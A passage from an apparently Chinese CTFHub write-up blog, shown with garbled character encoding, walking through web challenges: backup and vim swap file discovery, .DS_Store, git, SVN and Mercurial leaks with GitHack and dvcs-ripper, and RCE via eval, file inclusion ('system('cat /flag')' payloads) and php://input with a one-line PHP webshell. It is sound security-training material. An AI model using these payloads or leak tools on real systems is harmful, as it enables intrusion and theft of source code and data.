plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u http://challenge-522f6d9accc2c25c.sandbox.ctfhub.com:10800</span><br></pre></td></tr></table></figure><p>æ‰«æåˆ°äº†ä¸€ä¸ªæ˜¯index.htmlæ–‡ä»¶å’Œ<a href="http://www.zip/">www.zip</a> æ–‡ä»¶</p><p><img src="/2023/07/15/ctfhub/image-20230905151245957.png" alt="image-20230905151245957"></p><p>1.ç”¨è„šæœ¬è·‘ï¼ˆæ–¹æ³•äºŒï¼‰</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;&quot;</span>http://challenge-522f6d9accc2c25c.sandbox.ctfhub.com:<span class="number">10800</span></span><br><span class="line">a = [<span class="string">&#x27;web&#x27;</span>,<span class="string">&#x27;website&#x27;</span>,<span class="string">&#x27;backup&#x27;</span>,<span class="string">&#x27;back&#x27;</span>,<span class="string">&#x27;www&#x27;</span>,<span class="string">&#x27;wwwroot&#x27;</span>,<span class="string">&#x27;temp&#x27;</span>]</span><br><span class="line">b = [<span class="string">&#x27;tar&#x27;</span>,<span class="string">&#x27;tar.gz&#x27;</span>,<span class="string">&#x27;zip&#x27;</span>,<span class="string">&#x27;rar&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> b:</span><br><span class="line">pos = url + i + <span class="string">&#x27;.&#x27;</span> + j</span><br><span class="line">r = requests.get(pos)</span><br><span class="line"><span class="built_in">print</span>(i)</span><br><span class="line"><span class="built_in">print</span>(j)</span><br><span class="line"><span class="built_in">print</span>(r)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>2.è®¿é—®<a href="http://www.zipæ–‡ä»¶/">www.zipæ–‡ä»¶</a></p><p><img src="/2023/07/15/ctfhub/image-20230713164646825.png" alt="image-20230713164646825"></p><p>æ‰“å¼€è®°äº‹æœ¬ï¼Œå‘ç°</p><p><img src="/2023/07/15/ctfhub/image-20230713164750008.png" alt="image-20230713164750008"></p><p>å°è¯•å†ç½‘ç«™ä¸Šè®¿é—®ï¼Œå¾—åˆ°flag</p><p><img src="/2023/07/15/ctfhub/image-20230713165051679.png" alt="image-20230713165051679"></p><h3 id="bakæ–‡ä»¶"><a href="#bakæ–‡ä»¶" class="headerlink" title="bakæ–‡ä»¶"></a>bakæ–‡ä»¶</h3><p>1.æ ¹æ®æç¤ºè®¿é—®index.php.bakæ–‡ä»¶</p><p><img src="/2023/07/15/ctfhub/image-20230713170128212.png" alt="image-20230713170128212"></p><p>ä¸‹è½½å¹¶æŸ¥çœ‹</p><p><img src="/2023/07/15/ctfhub/image-20230713170638785.png" alt="image-20230713170638785"></p><h3 id="vimç¼“å­˜"><a href="#vimç¼“å­˜" class="headerlink" title="vimç¼“å­˜"></a>vimç¼“å­˜</h3><blockquote><blockquote><p><strong>åŸç†</strong>ï¼šåœ¨å¼€å‘äººå‘˜ä½¿ç”¨<code>vimç¼–è¾‘å™¨ç¼–è¾‘æ–‡æœ¬æ—¶</code>ï¼Œç³»ç»Ÿä¼šè‡ªåŠ¨ç”Ÿæˆä¸€ä¸ªå¤‡ä»½æ–‡ä»¶ï¼Œå½“ç¼–è¾‘å®Œæˆåï¼Œä¿å­˜æ—¶ï¼Œå…ƒæ–‡ä»¶ä¼šæ›´æ–°ï¼Œå¤‡ä»½æ–‡ä»¶ä¼šè¢«è‡ªåŠ¨åˆ é™¤ã€‚</p></blockquote><p>ä½†æ˜¯å½“vimå¼‚å¸¸é€€å‡ºåï¼Œå› ä¸ºæœªå¤„ç†ç¼“å­˜æ–‡ä»¶ï¼Œå¯¼è‡´å¯ä»¥é€šè¿‡ç¼“å­˜æ–‡ä»¶æ¢å¤åŸå§‹æ–‡ä»¶å†…å®¹ã€‚</p></blockquote><p>ä»¥index.phpä¸ºä¾‹</p><p>ç¬¬ä¸€æ¬¡äº§ç”Ÿçš„äº¤æ¢æ–‡ä»¶åä¸º <code>.index.php.swp</code></p><p>å†æ¬¡æ„å¤–é€€å‡ºåï¼Œå°†ä¼šäº§ç”Ÿçš„äº¤æ¢æ–‡ä»¶åä¸º <code>.index.php.swo</code></p><p>ç¬¬ä¸‰æ¬¡äº§ç”Ÿçš„äº¤æ¢æ–‡ä»¶å <code>.index.php.swn</code></p><p>è¿™äº›éšè—æ–‡ä»¶çš„ä½œç”¨ï¼š<code>å¯ç”¨æ¥æ¢å¤æ„å¤–é€€å‡ºæ–‡ä»¶</code></p><p><code>å¦‚ä½•åˆ©ç”¨</code></p><p><code>swp</code>å¤‡ä»½æ–‡ä»¶å°±æ˜¯éšè—æ–‡ä»¶ï¼Œæ“ä½œæ—¶éœ€è¦åœ¨æ–‡ä»¶åå‰<code>.</code></p><p>é’ˆå¯¹<code>swp</code>å¤‡ä»½æ–‡ä»¶ï¼Œå¯ä»¥ä½¿ç”¨vim -r filenameå‘½ä»¤æ¥æ¢å¤æ–‡ä»¶</p><p>ï¼ˆ<code>vim</code>ä½¿ç”¨çš„ç¼“å­˜å­˜å‚¨ä¸ºä¸€ç§å›ºå®šçš„äºŒè¿›åˆ¶æ–‡ä»¶ã€‚è€Œä¸€èˆ¬ç¼–è¾‘çš„å­—ç¬¦æ˜¯æ˜æ–‡å¯è§å­—ç¬¦ï¼Œåœ¨vimçš„ç¼“å­˜ä¸­è¿™äº›å¯è§å­—ç¬¦ä¼šåŸæ ·ä¿ç•™ï¼Œæ‰€ä»¥æ˜¾ç¤ºå‡ºæ¥çš„æ˜¯ä¹±ç ã€‚ï¼‰</p><p><img src="/2023/07/15/ctfhub/image-20230905152943890.png" alt="image-20230905152943890"></p><p>æ ¹æ®ç¼“å­˜æ–‡ä»¶çš„æç¤ºï¼Œè®¿é—®ä¸€ä¸‹ <code>.index.php.swp</code></p><p><img src="/2023/07/15/ctfhub/image-20230905154647151.png" alt="image-20230905154647151"></p><p>ä¸‹è½½æ–‡ä»¶ï¼Œæ‰“å¼€çœ‹çœ‹</p><p><img src="/2023/07/15/ctfhub/image-20230905155309507.png" alt="image-20230905155309507"></p><h3 id="DS-Store"><a href="#DS-Store" class="headerlink" title=".DS_Store"></a>.DS_Store</h3><p>é¢˜ç›®æè¿°ï¼š</p><blockquote><p>.DS_Store æ˜¯ Mac OS ä¿å­˜æ–‡ä»¶å¤¹çš„è‡ªå®šä¹‰å±æ€§çš„éšè—æ–‡ä»¶ã€‚é€šè¿‡.DS_Storeå¯ä»¥çŸ¥é“è¿™ä¸ªç›®å½•é‡Œé¢æ‰€æœ‰æ–‡ä»¶çš„æ¸…å•ã€‚</p><p>.DS_Store æ–‡ä»¶çš„ä¸»è¦ä½œç”¨ï¼Œæ˜¯å­˜å‚¨å½“å‰æ–‡ä»¶å¤¹åœ¨æ¡Œé¢æ˜¾ç¤ºç›¸å…³æ–¹é¢çš„ä¸€äº›è‡ªå®šä¹‰å±æ€§ï¼ŒåŒ…æ‹¬æ–‡ä»¶å›¾æ ‡çš„ä½ç½®ã€æ–‡ä»¶å¤¹ä¸Šæ¬¡æ‰“å¼€æ—¶çª—å£çš„å¤§å°ã€å±•ç°å½¢å¼å’Œä½ç½®ç­‰ã€‚</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">è®¿é—®url/.DS_Store</span><br></pre></td></tr></table></figure><p>1.æ ¹æ®é¢˜ç›®.DS_Storeæ–‡ä»¶æ˜¯ä¸€ä¸ªmac osçš„è‡ªå®šä¹‰å±æ€§çš„éšè—æ–‡ä»¶ï¼Œç„¶åæˆ‘ä»¬å¯ä»¥å…ˆä¸‹è½½æ–‡ä»¶çœ‹çœ‹</p><p>2.ä½¿ç”¨å·¥å…·python-destore</p><p>.DS_Dtoreæ–‡ä»¶æ³„æ¼åˆ©ç”¨è„šæœ¬ï¼Œè·å¾—DS_Storeå†…ç›®å½•ä¿¡æ¯ï¼Œæ‰§è¡Œå‘½ä»¤ï¼Œå‘ç°ä¸€ä¸ªtxtæ–‡ä»¶ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python main.py DS_Storeæ–‡ä»¶è·¯å¾„</span><br></pre></td></tr></table></figure><p><img src="/2023/07/15/ctfhub/image-20230911230927157.png" alt="image-20230911230927157"></p><p>urlè®¿é—®txtæ–‡ä»¶ï¼Œè·å¾—flag</p><p><img src="/2023/07/15/ctfhub/image-20230911231036164.png" alt="image-20230911231036164"></p><p>DS_Storeçš„ä¸€äº›çŸ¥è¯†ç‚¹è¡¥å……ï¼š</p><p>1.DS_Storeæ–‡ä»¶ç±»å‹</p><p><img src="/2023/07/15/ctfhub/image-20230911233231803.png" alt="image-20230911233231803"></p><h2 id="git-æ³„éœ²"><a href="#git-æ³„éœ²" class="headerlink" title="git æ³„éœ²"></a>git æ³„éœ²</h2><h3 id="log"><a href="#log" class="headerlink" title="log"></a>log</h3><blockquote><p>æç¤ºï¼šå½“å‰å¤§é‡å¼€å‘äººå‘˜ä½¿ç”¨gitè¿›è¡Œç‰ˆæœ¬æ§åˆ¶ï¼Œå¯¹ç«™ç‚¹è‡ªåŠ¨éƒ¨ç½²ã€‚å¦‚æœé…ç½®ä¸å½“ï¼Œå¯èƒ½ä¼šå°†.gitæ–‡ä»¶å¤¹ç›´æ¥éƒ¨ç½²åˆ°çº¿ä¸Šç¯å¢ƒã€‚è¿™å°±å¼•èµ·äº†git æ³„éœ²æ¼æ´ã€‚</p></blockquote><p>GitHackæ˜¯ä¸€ä¸ª<code>.git</code>æ³„éœ²åˆ©ç”¨æµ‹è¯•è„šæœ¬ï¼Œé€šè¿‡æ³„éœ²æ–‡ä»¶ï¼Œè¿˜åŸé‡å»ºå·¥ç¨‹æºä»£ç ã€‚</p><p>æ³¨ï¼šGiä»–hackè„šæœ¬çš„è¿è¡Œçš„ä½¿ç”¨ï¼Œæœ¬åœ°è¦æœ‰gitå·¥å…·</p><p>gitå¸¸ç”¨å‘½ä»¤</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">git reflog  æŸ¥çœ‹å†å²å‘½ä»¤</span><br><span class="line">git log     æŸ¥çœ‹æäº¤å†å²è®°å½•</span><br><span class="line">git reset   åˆ‡æ¢ç‰ˆæœ¬</span><br><span class="line">git diff    å¯¹æ¯”ä¸¤æ¬¡æäº¤</span><br><span class="line">git reflog  æŸ¥çœ‹å†å²å‘½ä»¤</span><br><span class="line">git stash  ä¿å­˜æ‰€æœ‰æœªæäº¤çš„ä¿®æ”¹</span><br><span class="line">git stash list æŸ¥çœ‹å½“å‰å­˜å‚¨åœ¨æ ˆä¸­çš„å†…å®¹</span><br><span class="line">git stash pop å¼¹å‡ºå½“å‰å­˜å‚¨åœ¨æ ˆä¸­çš„å†…å®¹</span><br><span class="line">git status   æŸ¥çœ‹å½“å‰ä»“åº“çš„çŠ¶æ€åŸç†ï¼š</span><br></pre></td></tr></table></figure><p>1.è§£æ<code>.git/index</code>æ–‡ä»¶ï¼Œæ‰¾åˆ°å·¥ç¨‹ä¸­æ‰€æœ‰çš„:(æ–‡ä»¶åï¼Œæ–‡ä»¶)</p><p>2.å»<code>.git/objects/</code>æ–‡ä»¶å¤¹ä¸‹ä¸‹è½½å¯¹åº”çš„æ–‡ä»¶</p><p>3.<code>zlib</code>è§£å‹æ–‡ä»¶ï¼ŒæŒ‰åŸå§‹çš„ç›®å½•ç»“æ„å†™å…¥æºä»£ç </p><p>1.ä½¿ç”¨Githubå·¥å…·è¿›è¡Œæ‰§è¡Œå‘½ä»¤ï¼Œå¯ä»¥çœ‹åˆ°æœ‰æ–‡ä»¶è¾“å‡º(æ–‡ä»¶ä¿å­˜åœ¨distæ–‡ä»¶å¤¹å†…)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 GitHack.py  http://challenge-3604c079763291ae.sandbox.ctfhub.com:10800/.git</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">githacker --url http://challenge-3604c079763291ae.sandbox.ctfhub.com:10800/.git/ --output-folder result</span><br></pre></td></tr></table></figure><h3 id><a href="#" class="headerlink" title></a></h3><h2 id="SVNæ³„éœ²"><a href="#SVNæ³„éœ²" class="headerlink" title="SVNæ³„éœ²"></a>SVNæ³„éœ²</h2><p>**é¢˜ç›®æè¿°:**å½“å¼€å‘äººå‘˜ä½¿ç”¨ SVN è¿›è¡Œç‰ˆæœ¬æ§åˆ¶ï¼Œå¯¹ç«™ç‚¹è‡ªåŠ¨éƒ¨ç½²ã€‚å¦‚æœé…ç½®ä¸å½“,å¯èƒ½ä¼šå°†.svnæ–‡ä»¶å¤¹ç›´æ¥éƒ¨ç½²åˆ°çº¿ä¸Šç¯å¢ƒã€‚è¿™å°±å¼•èµ·äº† SVN æ³„éœ²æ¼æ´ã€‚</p><blockquote><p>é¦–å…ˆè¿™ç±»é¢˜ç›®æˆ‘ä»¬ç”¨åˆ°SVNæ³„éœ²çš„å·¥å…·dvcs-ripper</p><p>ä¸‹é¢å…ˆåœ¨Linuxä¸‹å®‰è£…è¿™ä¸ªå·¥å…·</p><p>1.ä½¿ç”¨Linuxæ‰§è¡Œä¸‹é¢è¿™ä¸ªå‘½ä»¤ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/kost/dvcs-ripper.git</span><br></pre></td></tr></table></figure><p>2.è¿›å…¥åˆ°dvcs-ripperç›®å½•é‡Œ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd dvcs-ripper</span><br></pre></td></tr></table></figure><p>3.å¼€å§‹ä½¿ç”¨å·¥å…·</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./rip-svn.pl -u urlåœ°å€/.svn</span><br></pre></td></tr></table></figure><p>æ­¤æ—¶å¦‚æœæœ‰æŠ¥é”™ï¼š</p><p><img src="/2023/07/15/ctfhub/image-20230912230353185.png" alt="image-20230912230353185"></p><p>å°±æ‰§è¡Œä¸‹é¢çš„å‘½ä»¤ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install perl libio-socket-ssl-perl libdbd-sqlite3-perl libclass-dbi-perl libio-all-lwp-perl</span><br></pre></td></tr></table></figure></blockquote><p>é¢˜ç›®å¼€å§‹æˆ‘ä»¬å…ˆä½¿ç”¨å·¥å…·çœ‹çœ‹ï¼Œæ ¹æ®å·¥å…·çš„æç¤ºï¼Œ</p><p>ä½¿ç”¨å‘½ä»¤ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./rip-svn.pl -v -u http://challenge-8381a0b862538a3b.sandbox.ctfhub.com:10800/.svn</span><br></pre></td></tr></table></figure><p><img src="/2023/07/15/ctfhub/image-20230916212355969.png" alt="image-20230916212355969"></p><p>ç¯å¢ƒå¯åŠ¨å®Œæˆï¼Œå¯ä»¥çœ‹ä¸€ä¸‹æ ¹ç›®å½•åº•ä¸‹çš„æ–‡ä»¶å’ŒçŠ¶æ€</p><p><img src="/2023/07/15/ctfhub/image-20230916212557127.png" alt="image-20230916212557127"></p><p>çœ‹åˆ°æœ‰.svn è¯´æ˜å­˜åœ¨svnæ³„éœ²ï¼Œæˆ‘ä»¬çœ‹çœ‹.svnåº•ä¸‹ç›®å½•æ–‡ä»¶</p><p><img src="/2023/07/15/ctfhub/image-20230916212814856.png" alt="image-20230916212814856"></p><h2 id="HGæ³„éœ²"><a href="#HGæ³„éœ²" class="headerlink" title="HGæ³„éœ²"></a>HGæ³„éœ²</h2><p><strong>é¢˜ç›®æè¿°ï¼š</strong>å½“å¼€å‘äººå‘˜ä½¿ç”¨ Mercurial è¿›è¡Œç‰ˆæœ¬æ§åˆ¶ï¼Œå¯¹ç«™ç‚¹è‡ªåŠ¨éƒ¨ç½²ã€‚å¦‚æœé…ç½®ä¸å½“,å¯èƒ½ä¼šå°†.hg æ–‡ä»¶å¤¹ç›´æ¥éƒ¨ç½²åˆ°çº¿ä¸Šç¯å¢ƒã€‚è¿™å°±å¼•èµ·äº† hg æ³„éœ²æ¼æ´ã€‚</p><p>ä¹Ÿæ˜¯ä½¿ç”¨dvcs-ripperå·¥å…·æ‰«æä¸€ä¸‹ï¼Œå‘ç°è¿˜æ˜¯åˆä¸€äº›æ–‡ä»¶æ‰«ä¸åˆ°</p><p><img src="/2023/07/15/ctfhub/image-20230916223542731.png" alt="image-20230916223542731"></p><p>å…ˆè®¿é—®ä¸€äº›æ‰«åˆ°çš„æ–‡ä»¶ï¼Œå‘ç°æœ‰.hgæ–‡ä»¶ï¼Œè¯´æ˜å­˜åœ¨hgæ³„éœ²</p><p><img src="/2023/07/15/ctfhub/image-20230916224308401.png" alt="image-20230916224308401"></p><p>çœ‹çœ‹.hgåº•ä¸‹çš„æ–‡ä»¶</p><p><img src="/2023/07/15/ctfhub/image-20230916224747801.png" alt="image-20230916224747801"></p><p>çœ‹ç€è¿™äº›éƒ½æ²¡æœ‰æ˜æ˜¾çš„flagæ•æ„Ÿä¿¡æ¯ï¼Œæ‰€ä»¥è¿›å…¥åˆ°storeæ–‡ä»¶å¤¹é‡Œ</p><p><img src="/2023/07/15/ctfhub/image-20230916225352809.png" alt="image-20230916225352809"></p><p>å¥½åƒä¹Ÿæ²¡æœ‰çœ‹åˆ°æ•æ„Ÿçš„ä¿¡æ¯</p><p>å¯ä»¥é‡‡ç”¨å…¨å±€æœç´ è¯•è¯•ï¼Œåœ¨å½“å‰ç›®å½•ä¸‹ï¼ŒæŸ¥æ‰¾å†…å®¹åŒ…å«flagçš„æ–‡ä»¶å¯¹åº”å†…å®¹ï¼Œå‘½ä»¤ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep  -r  &quot;flag&quot; ./</span><br></pre></td></tr></table></figure><p><img src="/2023/07/15/ctfhub/image-20230916225542735.png" alt="image-20230916225542735"></p><p>è®¿é—®flag_179055738.txtå¯ä»¥è·å¾—flag</p><p><img src="/2023/07/15/ctfhub/image-20230916225753519.png" alt="image-20230916225753519"></p><h1 id="rce"><a href="#rce" class="headerlink" title="rce"></a>rce</h1><h2 id="evalæ‰§è¡Œ"><a href="#evalæ‰§è¡Œ" class="headerlink" title="evalæ‰§è¡Œ"></a>evalæ‰§è¡Œ</h2><p>æ‰“å¼€é¶åœºç¯å¢ƒï¼Œçœ‹åˆ°ä»£ç ï¼Œåˆ†æä¸€ä¸‹ï¼Œè¯»å–è¯·æ±‚ä½“çš„å‚æ•°cmdï¼Œä¼ å…¥evalä¸­å½“åšphpä»£ç æ‰§è¡Œ</p><p><img src="/2023/07/15/ctfhub/image-20230819172024259.png" alt="image-20230819172024259"></p><p>å°è¯•ä¸€ä¸‹æ‰§è¡Œå‘½ä»¤ï¼Œå‘ç°å½“å‰æ–‡ä»¶å¤¹æ˜¯index.php</p><p><img src="/2023/07/15/ctfhub/image-20230819172424118.png" alt="image-20230819172424118"></p><p>æŸ¥çœ‹æ ¹ç›®å½•åº•ä¸‹æ–‡ä»¶</p><p><img src="/2023/07/15/ctfhub/image-20230819172647278.png" alt="image-20230819172647278"></p><p>å‘ç°flag_8348,catä¸€ä¸‹ï¼Œå¾—flag</p><p><img src="/2023/07/15/ctfhub/image-20230819172905694.png" alt="image-20230819172905694"></p><p>å®Œæˆï¼</p><h2 id="æ–‡ä»¶åŒ…å«"><a href="#æ–‡ä»¶åŒ…å«" class="headerlink" title="æ–‡ä»¶åŒ…å«"></a>æ–‡ä»¶åŒ…å«</h2><p>1.æ‰“å¼€æ–‡ä»¶</p><p><img src="/2023/07/15/ctfhub/image-20230820163300923.png" alt="image-20230820163300923"></p><p>2.å‘ç°æœ‰ä¸ªè¶…é“¾æ¥ï¼Œç‚¹å‡»shellçœ‹çœ‹ä¼šå‡ºç°ä»€ä¹ˆ</p><p><img src="/2023/07/15/ctfhub/image-20230820211443735.png" alt="image-20230820211443735"></p><p>3.ä¸Šä¸ªç›®å½•æ²¡æœ‰å¾—åˆ°æƒ³è¦çš„ï¼ŒæŸ¥çœ‹ä¸Šä¸ªç›®å½•ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=shell.txt&amp;ctfhub=system(&#x27;ls&#x27;);</span><br></pre></td></tr></table></figure><p>includeæ˜¯æ–‡ä»¶åŒ…å«ï¼Œ</p><p>include:å‡ºç°é”™è¯¯æ—¶ï¼Œä¼šå‡ºç°è­¦å‘Šä½†æ˜¯ç¨‹åºä¼šç»§ç»­æ‰§è¡Œ</p><p>fileå‚æ•°åŒ…å«æ•°shell.txtæ–‡ä»¶ï¼Œshell.txtæ–‡ä»¶é‡Œé¢æœ‰rceå‘½ä»¤</p><p>æ‰§è¡Œã€‚</p><p><img src="/2023/07/15/ctfhub/image-20230820220233427.png" alt="image-20230820220233427"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=shell.txt&amp;ctfhub=system(&#x27;ls /&#x27;);</span><br></pre></td></tr></table></figure><p><img src="/2023/07/15/ctfhub/image-20230820220321509.png" alt="image-20230820220321509"></p><p>æ‰€ä»¥è¿™ä¸ªé¢˜æˆ‘ä»¬å¯ä»¥ä¼ ä¸¤ä¸ªå‚æ•°</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=shell.txt&amp;ctfhub=system(&#x27;cat /flag&#x27;);</span><br></pre></td></tr></table></figure><p><img src="/2023/07/15/ctfhub/image-20230820220410558.png" alt="image-20230820220410558"></p><h2 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h2><p>è¿™é‡Œå…ˆäº†è§£ä¸€ä¸‹php://input</p><p>php://ç”¨æ¥è®¿é—®å„ä¸ªè¾“å…¥ã€è¾“å‡ºæµ</p><p>php://inputç”¨æ¥è®¿é—®è¯·æ±‚çš„åŸå§‹æ•°æ®çš„åªè¯»æµï¼Œå¯ä»¥æ¥æ”¶postè¯·</p><p>æ±‚ä½œä¸ºè¾“å…¥æµçš„è¾“å…¥ï¼Œå°†è¯·æ±‚ä½œä¸ºPHPä»£ç è¾“å…¥ï¼Œä»¥è¾¾åˆ°ä»¥postçš„å½¢</p><p>å¼è¿›è¡Œè¾“å…¥çš„ç›®çš„</p><p>phpä»£ç è¾“å…¥ï¼Œä»¥è¾¾åˆ°ä»¥postçš„å½¢å¼è¿›è¡Œè¾“å…¥çš„ç›®çš„</p><p>1.å¼€å§‹åšé¢˜ï¼Œå…ˆçœ‹é¢˜ç›®</p><p><img src="/2023/07/15/ctfhub/image-20230821145552415.png" alt="image-20230821145552415"></p><p>(1).åˆ†æä¸€ä¸‹ä»£ç ï¼Œä¼ å…¥ä¸€ä¸ªfileå‚æ•°ï¼Œç”¨äºæ£€æŸ¥<code>$_GET[&#39;file&#39;]</code>æ˜¯å¦å·²è®¾ç½®ï¼Œ<code>$_GET</code>æ˜¯ä¸€ä¸ªè¶…å…¨å±€å˜é‡ï¼Œå®ƒç”¨äºæ”¶é›†æ¥è‡ªurlå‚æ•°çš„æ•°æ®ã€‚<strong>issetå‡½æ•°æ£€æŸ¥å˜é‡æ˜¯å¦è®¾ç½®å¹¶ä¸”ä¸ä¸º<code>null</code>ã€‚å®ƒä¸ä¼šæ£€æŸ¥å˜é‡çš„å€¼æ˜¯å¦ä¸ºç©ºå­—ç¬¦ä¸²ã€ç©ºæ•°ç»„æˆ– <code>false</code>ã€‚å¦‚æœæ‚¨éœ€è¦æ£€æŸ¥å˜é‡çš„å€¼æ˜¯å¦ä¸ºç©ºï¼Œå¯ä»¥ä½¿ç”¨ <code>empty</code> å‡½æ•°ã€‚</strong></p><p>(2).<code>if ( substr($_GET[&quot;file&quot;], 0, 6) = = = &quot;php://&quot; )</code>ä»£ç ç”¨æ¥åˆ¤æ–­<code>$_GET[&#39;file&#39;]</code>çš„å‰6ä¸ªå­—ç¬¦æ˜¯å¦ä¸ºâ€œphp://â€ï¼Œå¦‚æœæ˜¯å®ƒå°†ç”¨includeå‡½æ•°åŒ…å«<code>$_GET[&#39;file&#39;]</code>æŒ‡å®šçš„æ–‡ä»¶ã€‚<code>substr</code>å‡½æ•°ç”¨äºè¿”å›å­—ç¬¦ä¸²çš„å­ä¸²ã€‚<code>$_GET[&#39;file&#39;]</code>çš„å‰6ä¸ªå­—ç¬¦<code>= = =</code>è¿ç®—ç¬¦å°†ä¸<code>â€œphp://â€</code>è¿›è¡Œæ¯”è¾ƒï¼Œä¸¤ä¸ªç›¸ç­‰çš„è¯ï¼Œæ‰§è¡Œifè¯­å¥å—çš„ä»£ç ã€‚</p><p>2.ç‚¹å‡»phpinfoæŸ¥çœ‹é…ç½®</p><blockquote><p>allow_url_fopen=on</p><p>allow_url_include=on</p></blockquote><p><img src="/2023/07/15/ctfhub/image-20230821213333963.png" alt="image-20230821213333963"></p><p>å¯ä»¥ç”¨<code>php://input</code>ç”¨äº<strong>æ‰§è¡Œphpä»£ç </strong>ï¼Œ</p><p><strong>æ‰©å±•çŸ¥è¯†</strong></p><blockquote><p>php://inputæ˜¯ä¸€ä¸ªå¯ä»¥è®¿é—®è¯·æ±‚çš„åŸå§‹æ•°æ®çš„åªè¯»æµã€‚å½“è¯·æ±‚æ–¹å¼postï¼Œå¹¶ä¸”Content-Typeä¸ç­‰äºâ€œmultipart/from-dataâ€æ—¶ï¼Œå¯ä»¥ä½¿ç”¨<code>php://input</code>æ¥è·å–åŸå§‹è¯·æ±‚çš„æ•°æ®ã€‚</p><p><strong>ä¸ºä»€ä¹ˆpostä¼ å‚content-typeçš„ç±»å‹ä¸multipart/from-dataï¼Ÿ</strong></p><p>å½“ä½¿ç”¨ <code>php://input</code> è¯»å– POST è¯·æ±‚çš„åŸå§‹æ•°æ®Content-Type çš„ç±»å‹ä¸èƒ½æ˜¯ <code>multipart/form-data</code>ã€‚è¿™æ˜¯å› ä¸º <code>php://input</code> åªèƒ½ç”¨äºè¯»å–éæ–‡ä»¶ä¸Šä¼ çš„ POST æ•°æ®ï¼Œå½“è¡¨å•ä¸­åŒ…å«æ–‡ä»¶ä¸Šä¼ æ—¶ï¼Œåº”è¯¥ä½¿<code>enctype=&quot;multipart/form-data&quot;</code>ï¼Œå¹¶é€šè¿‡ <code>$_FILES</code> <code>è¶…å…¨å±€å˜é‡</code>æ¥è®¿é—®ä¸Šä¼ çš„æ–‡ä»¶ã€‚</p><p><strong>ä¸ºä»€ä¹ˆpostä¼ å‚content-typeçš„ç±»å‹ä¸èƒ½æ˜¯multipart/from-dataï¼Ÿ</strong></p><p>å½“ä½¿ç”¨ <code>php://input</code> è¯»å– POST è¯·æ±‚çš„åŸå§‹æ•°æ®æ—¶ï¼ŒContent-Type çš„ç±»å‹ä¸èƒ½æ˜¯ <code>multipart/form-data</code>ã€‚è¿™æ˜¯å› ä¸º <code>php://input</code> åªèƒ½ç”¨äºè¯»å–éæ–‡ä»¶ä¸Šä¼ çš„ POST æ•°æ®ã€‚å½“è¡¨å•ä¸­åŒ…å«æ–‡ä»¶ä¸Šä¼ æ—¶ï¼Œåº”è¯¥ä½¿ç”¨<code>enctype=&quot;multipart/form-data&quot;</code>ï¼Œå¹¶é€šè¿‡ <code>$_FILES</code> è¶…å…¨å±€å˜é‡æ¥è®¿é—®ä¸Šä¼ çš„æ–‡ä»¶ã€‚</p></blockquote><blockquote><p><strong>è¶…å…¨å±€å˜é‡ï¼š</strong></p><p>è¶…å…¨å±€å˜é‡åœ¨ä¸€ä¸ªè„šæœ¬çš„å…¨éƒ¨ä½œç”¨åŸŸä¸­éƒ½å¯ç”¨ï¼Œåœ¨å‡½æ•°æˆ–æ–¹æ³•ä¸­æ— éœ€æ‰§è¡Œglobal $variable,å°±å¯ä»¥è®¿é—®å®ƒä»¬ã€‚</p><p>å¸¸è§çš„è¶…å…¨å±€å˜é‡æœ‰:<code>$GLOBALS</code>,<code>_SERVER</code>,<code>$_REQUEST</code>,<code>$_POST</code>,<code>_GET</code>,<code>$_FILES</code>,<code>$_ENV</code>,<code>$_COOKIE</code>,<code>_SESSION</code></p></blockquote><p>æŠ“ä¸ªåŒ…çœ‹çœ‹,æŠŠgetä¼ å‚æ–¹å¼ä¸ºpostï¼Œç›®æ ‡ä¿®æ”¹ä¸º/?file=php://input</p><p>å°†ä¸Šä¼ ä¸€å¥è¯æœ¨é©¬<code>&lt;?php system(&#39;ls 